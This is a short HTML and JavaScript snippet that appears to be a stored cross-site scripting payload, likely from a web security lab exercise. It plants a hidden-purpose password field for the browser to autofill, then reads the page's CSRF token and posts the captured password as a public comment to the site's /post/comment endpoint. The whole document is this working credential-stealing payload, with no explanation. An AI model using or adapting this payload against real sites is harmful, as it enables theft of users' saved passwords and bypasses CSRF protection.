<input type='password' name='password' id='password' onchange="post()">
<script>

function post() {
    var data = new FormData();
    const csrf = document.getElementsByName('csrf')[0].value;
    data.append('csrf', csrf);
    data.append('postId', 2);
    data.append('comment', document.getElementById('password').value);
    data.append('name', 'dexter');
    data.append('email', 'dmorgan@gmail.com');
    data.append('website', 'http://tonightsthenight.com');

fetch("/post/comment", {method: "POST", body: data });
}  
</script>
